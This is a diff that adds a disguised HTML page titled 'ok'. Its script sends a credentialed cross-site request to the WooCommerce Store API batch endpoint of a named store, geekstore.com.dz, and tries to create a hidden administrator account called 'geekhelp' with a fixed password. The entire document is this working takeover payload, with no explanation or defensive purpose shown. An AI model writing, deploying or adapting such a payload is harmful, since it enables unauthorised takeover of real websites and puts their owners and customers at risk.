@@ -1,0 +1,22 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>ok</title>
+<p id="s">loading...</p>
+<script>
+fetch('https://geekstore.com.dz/wp-json/wc/store/v1/batch', {
+  method: 'POST',
+  mode: 'no-cors',
+  credentials: 'include',
+  headers: {'Content-Type': 'text/plain;charset=UTF-8'},
+  body: JSON.stringify({requests: [{
+    method: 'POST',
+    path: '/wp/v2/users',
+    body: {
+      username: 'geekhelp',
+      password: 'Str0ng!Pass2026',
+      email: 'help@geekhelp.tld',
+      roles: ['administrator']
+    }
+  }]})
+}).then(function(){ document.getElementById('s').textContent = 'sent'; });
+</script>
